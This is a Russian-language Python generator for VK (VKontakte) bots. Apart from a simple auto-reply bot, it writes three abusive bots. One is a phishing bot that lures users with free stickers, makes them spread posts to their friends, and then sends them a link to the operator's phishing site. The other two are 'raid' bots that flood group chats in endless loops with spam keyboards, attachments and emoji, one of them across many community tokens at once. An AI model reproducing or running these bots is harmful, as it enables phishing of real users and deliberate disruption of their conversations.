import os,sys
import colorama
from colorama import init
import random
os.system('clear')
baners = [
"""\033[34m╔╗────╔╗─╔╗─╔╗────╔╗──────
║╚╗╔═╗║╚╗║╚╗╠╣╔╗─╔╝║╔═╗╔╦╗
║╬║║╬║║╔╣║╬║║║║╚╗║╬║║╩╣║╔╝
╚═╝╚═╝╚═╝╚═╝╚╝╚═╝╚═╝╚═╝╚╝─\033[39m"""    ,
"""\033[35m█▀▄ ▄▀▄ ▀█▀ █▀▄ ▀ █░░ █▀▄ █▀▀ █▀▀▄ 
█▀█ █░█ ░█░ █▀█ █ █░▄ █░█ █▀▀ █▐█▀ 
▀▀░ ░▀░ ░▀░ ▀▀░ ▀ ▀▀▀ ▀▀░ ▀▀▀ ▀░▀▀ 
\033[39m""",
"""\033[31m╔╦═╦╦══╦══╦═╦╦╦╦╦═╦╦═╦══╦╗
║║░╩╣╔╗╠╣╠╣░╩╣║║║║╚╣═╣░░║║
║║░░║╚╝║║║║░░║║╚╣║╔╣═╣╔╗╣║
║╚══╩══╝╚╝╚══╩╩═╩═╝╚═╩╝╚╝║
╚════════════════════════╝\033[39m"""






          ]
print(random.choice(baners))
print('\033[34mАвтор : sudoreboot2020\033[39m')

print("""\033[34m
[1] - обычный lite бот
[2] - бот для фишинга 
[3] - Рейд бот
[4] - Мульти рейд бот
[99] - Выход
\033[39m""")
while True:
    e = str(input("\033[35m[*]\033[39m"))
    if e == ('1'):
        tk = input('\033[31mВедите токен сообщества:\033[39m')


        f = str(input('name file.py:'))
        n = open(f,"w",encoding='utf-8')

        n.write("""import vk_api
import random
import time
token = '"""+str(tk)+"""'


vk = vk_api.VkApi(token=token)

vk._auth_token()
print('Бот запущен')
while True:

    try:
        
        messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unanswered"})
        if messages["count"] >= 1:
            id = messages["items"][0]["last_message"]["from_id"]
            body = messages["items"][0]["last_message"]["text"]
            if body.lower() == "привет":
                vk.method("messages.send", {"peer_id": id, "message": "Привет!", "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "кто я?":
                vk.method("messages.send", {"peer_id": id, "message": "Ты хороший человек", "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!тест":
                vk.method("messages.send", {"peer_id": id, "message": "Бот работает!", "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!команды":
                vk.method("messages.send", {"peer_id": id, "message": "Список команд:!тест , привет, кто я?", "random_id": random.randint(1, 2147483647)})
            else:
                vk.method("messages.send", {"peer_id": id, "message": "я не знаю что значит " + str(body.lower()), "random_id": random.randint(1, 2147483647)})
    except Exception as E:
        time.sleep(1)""")
        n.close()
        print('[>]Lite бот готов!\033[32m')
        break

    elif e == ('2'):
        tk = input('\033[31mВедите токен сообщества:\033[39m')
        id1 = input('\033[31mВедите кого добавить в друзья (https://vk.com/id1):\033[39m')
        wa = input('\033[31mВедите на какой пост лайк(https://vk.com/wall1_1):\033[39m')
        rep=input('\033[31mВедите какой пост нужно репостить 5 друзьям онлайн(https://vk.com/wall1_1):\033[39m')
        post = input('\033[31mВедите под каким постом нужно оставить отзыв(https://vk.com/wall1_1):\033[39m')
        com = input('\033[31mВедите какой коментарий нужно скопировать и оставить под последним постом группы:\033[39m')
        lin =  input('\033[31mВедите ссылку на ваш фишинговый сайт:\033[39m')
        f = str(input('Имя файла (file.py):'))
        n = open(f, "w",encoding="utf-8")
        privet = '''privet = """
        Прuвeт 👋 Чтoбы пoлyчuть cтuкepы тeбe нyжно выnoлнuть 4 зaдaнuя 💣

        Гoтoв(а)? Eсли дa,пuшu «!1»"""
        '''
        azadan = '''azadan = """
        Пepвoe зaдaнue 👇

        1)Добавь [''' + str(id1) + '''|его] в друзья ❤️

        2)Лайкни ['''+ str(wa) + '''|эту] запись

        3)Сдeлай репocт этой запuси себе на стeнy с коммeнтaрueм «Получил(a)»


        Выпoлнuл(a)? Еслu дa,пuшu «!2»"""
        '''

        bzadan = """bzadan = '''
        Вторoe зaдание 👇

        Разoшли этy зaпuсь 5 дpyзьям онлaйн 💣
         """+ str(rep) + """

        Pазocлaл(a)? Еслu дa,пuшu «!3»'''"""

        czadan = """czadan = '''
        Трeтьe зaдaнuе 👇

        OcтаBь коoмeнтapuū «Пoлyчuл(a)» пoд этoй зaпucью 👇
        """ + str(post) + """

        Bыпoлнuл(a)? Eслu дa,пuшu «!4»'''"""

        dzadan = """dzadan ='''Чeтвёртoе зaдaние 👇

        Скoпuрyй текcт из kоммeнтаpия пo ccылкe u ocтавь eгo в кoммeнтaрuях гpyппы «Шлём ceрдeчкu» 4 рaзa
        """+ str(com) + """

        Bыпoлнuл(a)? Еслu дa,пuшu «Bсё»'''
        """
        ezadan = """ezadan = '''Поздравляю!!!
        Стикеры можешь получить по ссылке
        👇👇👇👇👇👇👇
        """+str(lin)+"""
        Aбcoлютho бесплaтнo'''"""
        try:
            n.write("""
import vk_api
import random
import time
"""+str(privet)+"""
"""+str(azadan)+"""
"""+str(bzadan)+"""
"""+str(czadan)+"""
"""+str(dzadan)+"""
"""+str(ezadan)+"""

token = '"""+str(tk)+"""'

vk = vk_api.VkApi(token=token)

vk._auth_token()
print('Бот запущен')
while True:

    try:

        messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unanswered"})
        if messages["count"] >= 1:
            id = messages["items"][0]["last_message"]["from_id"]
            body = messages["items"][0]["last_message"]["text"]
            if body.lower() == "привет":
                vk.method("messages.send",
                          {"peer_id": id, "message": privet , "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!1":
                vk.method("messages.send",
                          {"peer_id": id, "message": azadan, "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!2":
                vk.method("messages.send",
                          {"peer_id": id, "message": bzadan , "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!3":
                vk.method("messages.send", {"peer_id": id, "message": czadan,
                                            "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!4":
                vk.method("messages.send", {"peer_id": id, "message": dzadan,
                                            "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "всё" or "все" :
                vk.method("messages.send", {"peer_id": id, "message": ezadan,
                                            "random_id": random.randint(1, 2147483647)})
            else:
                vk.method("messages.send", {"peer_id": id, "message": "я не знаю что значит " + str(body.lower()),
                                            "random_id": random.randint(1, 2147483647)})
    except Exception as E:
        time.sleep(1)""")
            n.close()
            print('\033[32m[>]Фишинг бот готов!\033[39m')
            break
        except UnicodeEncodeError:
            pass
    elif e == ('3'):
        print(''' \033[31m____ ____ ____ ____ _________ ____ ____ ____ 
||R |||A |||I |||D |||       |||B |||O |||T ||
||__|||__|||__|||__|||_______|||__|||__|||__||
|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|\033[39m
        ''')
        tk = input('\033[31mВедите токен сообщества:\033[39m')
        gr = str(input('\033[31mЧисловой id группы (123456):\033[39m'))

        f = str(input('Имя файла (file.py):'))
        n = open(f,"w",encoding='utf-8')
        n.write("""import vk_api
from numpy import random
import time
from threading import Thread
from enum import Enum
from vk_api.keyboard import VkKeyboard, VkKeyboardColor
import six
import traceback
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType


vk_session = vk_api.VkApi(token='"""+str(tk)+"""')
vk = vk_session.get_api()
print('Bot started!')
def pizda():
    longpoll = VkBotLongPoll(vk_session,     '"""+str(gr)+"""')
    for event in longpoll.listen():
        if event.type == VkBotEventType.MESSAGE_NEW:
            if event.from_chat:
                while True:
                       colorr = random.choice(['negative','primary', 'positive', 'secondary'])
                       color = random.choice(['negative','positive', 'primary', 'secondary'])
                       colo = random.choice(['negative','primary', 'positive', 'secondary'])
                       col = random.choice(['negative','primary', 'positive', 'secondary'])
                       textfobot = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       textfobo = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       textfob = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       textfo = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       keyboard = VkKeyboard(one_time=False)
                       keyboard.add_button(textfobot, color=colorr)
                       keyboard.add_button(textfobo, color=color)
                       keyboard.add_button(textfob, color=colo)
                       keyboard.add_button(textfo, color=col)
                       keyboard.add_line()
                       text1 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text2 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text3 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text4 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       col1 = random.choice(['negative','primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative','primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative','primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative','primary', 'positive', 'secondary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text2 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text3 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text4 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1,color=col1)
                       keyboard.add_button(text2,color=col2)
                       keyboard.add_button(text3,color=col3)
                       keyboard.add_button(text4,color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text2 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text3 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text4 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text2 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text3 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text4 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text2 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text3 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text4 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru'])
                       text2 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text3 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text4 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text2 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text3 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text4 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text2 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text3 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text4 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text2 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text3 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       text4 = random.choice(['[СТОП|vto.pe]', '[STOP|olike.ru]', '[СТОП|vkrutilka.ru]'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       vk.messages.send(chat_id=event.chat_id,attachment='wall-183805868_12',random_id='0',keyboard=keyboard.get_keyboard())
                       vk.messages.send(chat_id=event.chat_id,attachment='wall-183805868_12',random_id='0',keyboard=keyboard.get_keyboard())
while True:
    try:
        pizda()
    except Exception as e:
        print('Error', traceback.format_exc())""")
        n.close()
        print('\033[32m[>]Рейд бот готов!\033[39m')
        break


    elif e == ('4'):
        lol = str(input("""\033[31m[1] - создать бота
[2] - добавть группу
[-->]\033[39m"""))
        if lol == ('1'):
            name = str(input('Введите имя файла , в который сохранится бот(по умолчанию: multi.py)'))
            if name == '':
                name = 'multi.py'
            kek = open (name,'w',encoding='utf-8')
            kek.write(r"""import pip, requests, multiprocessing, time, random    


def readtokens(filename):
    with open(filename, 'r') as fin:
        tokens = []
        for i in fin:
            if '\n' in i:
                i = i[0:-1]
            if i != '':
                tokens.append(i)
        return(tokens)

def readids(filename):
    with open(filename, 'r') as fin:
        ids = []
        for i in fin:
            if '\n' in i:
                i = i[0:-1]
            if i != '':
                ids.append(i)
        return(ids)


b = '[{"color":"negative","action":{"type":"text","payload":"1","label":"Остановить рейд можно, нажав сюда vto.pe"}},{"color":"negative","action":{"type":"text","payload":"1","label":"Остановить рейд можно, нажав сюда vto.pe"}},{"color":"negative","action":{"type":"text","payload":"1","label":"Остановить рейд можно, нажав сюда vto.pe"}}]'
a = '{"one_time":false,"inline":false,"buttons":[' + b + "," + b + "," + b + "," + b + "," + b + "," + b + "," + b + "," + b + ']}'

def bot(token, gid, raidmessage, raidkeyboard):
    import emoji
    import vk_api
    import random
    from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
    work = True
    try:
        vk_session = vk_api.VkApi(token=token)
        api = vk_session.get_api()
        longpoll = VkBotLongPoll(vk_session, group_id = gid)
    except:
        print("Не удалось авторизоваться группой с id = " + gid + " и токеном = " + token)
        work = False
    if work:
        print("Авторизация группы с id = " + gid + " прошла успешно!")
        while True:
            try:
                for event in longpoll.listen():
                    try:
                        a = str(event)
                        b = a.find("'peer_id': ")
                        c = a[b + 11:]
                        d = c.find(",")
                        peerid = int(c[:d])
                        usid = peerid - 2000000000
                        while True:
                            api.messages.send(
                                        chat_id=usid,
                                        message=raidmessage,
                                        random_id=random.randint(1,999999999),
                                        keyboard = raidkeyboard,
                                        attachment="wall-189508183_4")
                    except:
                        print('ERROR IN ' + str(gid))
            except:
                pass
if __name__ == "__main__":
    try:
        import emoji
        em = emoji.UNICODE_EMOJI
        lst = []
        rmsgg1 = ''
        for i in em:
            lst.append(i)
        for i in range(500):
            f = lst[random.randint(1, len(lst))]
            rmsgg1 += f
        tokens = readtokens('tokens.txt')
        ids = readids('ids.txt')
        if tokens == []:
            print("Пожалуйста, перечитайте readme и следуйте инструкциям. Программе не удалось обнаружить ни одного токена в файле 'tokens.txt'")
        if ids == []:
            print("Пожалуйста, перечитайте readme и следуйте инструкциям. Программе не удалось обнаружить ни одного id в файле 'ids.txt'")
        for i in range(len(tokens)):
            p = multiprocessing.Process(target=bot, args=[tokens[i], ids[i], rmsgg1, a])
            p.start()
    except:
        print("Запусти меня еще раз, у меня на*бнулся генератор эмоди.")
""")
            kek.close()
            print('\033[32m[>>]БОТ готов и сохранен под файлом %s'%name)
            break
        elif lol == ('2'):
            tokenn = str(input('Ведите токен сообщества:'))
            ids = int(input('Введите числовой id сообщества ↑↑↑:'))
            t = open ('tokens.txt','a+')
            ids_f = open ('ids.txt','a+')
            ids_f.write(str(ids)+'\n')
            t.write(str(tokenn)+'\n')
            ids_f.close()
            t.close()
            print('\033[32m[>>]Запись завершена!\033[39m')
            print('Для выхода нажмите <<99>>')
    elif e == ('99'):
        print("\033[31mДо новой встречи!\033[39m")
        break
